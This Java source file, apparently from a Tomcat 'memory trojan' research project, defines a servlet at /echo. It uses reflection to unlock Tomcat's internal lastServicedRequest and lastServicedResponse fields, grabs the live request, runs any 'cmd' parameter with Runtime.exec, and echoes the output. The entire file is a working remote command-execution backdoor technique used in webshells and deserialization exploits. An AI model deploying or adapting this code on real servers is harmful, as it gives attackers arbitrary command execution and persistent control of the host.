package com.yyjccc.memorytrojan.Echo;


import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

@WebServlet("/echo")
public class Tomcat_Local extends HttpServlet {
	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) {

		try {
			//反射获取所需属性
			Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
			Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
			Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
			//使用modifiersField反射修改final型变量
			java.lang.reflect.Field modifiersField = Field.class.getDeclaredField("modifiers");
			modifiersField.setAccessible(true);
			modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
			modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
			modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
			WRAP_SAME_OBJECT_FIELD.setAccessible(true);
			lastServicedRequestField.setAccessible(true);
			lastServicedResponseField.setAccessible(true);
			//将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量
			//第一次请求进行初始化
			if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null)){
				WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
			}
			if (lastServicedRequestField.get(null)==null){
				lastServicedRequestField.set(null, new ThreadLocal<>());
			}
			if (lastServicedResponseField.get(null)==null){
				lastServicedResponseField.set(null, new ThreadLocal<>());
			}
			//第二次请求获取request变量
			if(lastServicedRequestField.get(null)!=null){
				ThreadLocal threadLocalReq = (ThreadLocal) lastServicedRequestField.get(null);
				ThreadLocal threadLocalRes =(ThreadLocal) lastServicedResponseField.get(null);
				HttpServletRequest request = (HttpServletRequest) threadLocalReq.get();
				HttpServletResponse response= (HttpServletResponse) threadLocalRes.get();
				if(request!=null || response!=null){
					cmdEcho(request,response);
				}
			}
		} catch (NoSuchFieldException | IllegalAccessException | ClassNotFoundException e) {
			e.printStackTrace();
		}
	}


	public  void cmdEcho(HttpServletRequest request,HttpServletResponse response){
		PrintWriter writer;
		response.setCharacterEncoding("gbk");
		try {
			writer = response.getWriter();
			String cmd = request.getParameter("cmd");
			InputStream inputStream;
			if(cmd!=null){
				inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
				Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
				String result = scanner.hasNext()?scanner.next():"";
				scanner.close();
				writer.write(result);
				writer.flush();
				writer.close();
			}

		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}
}
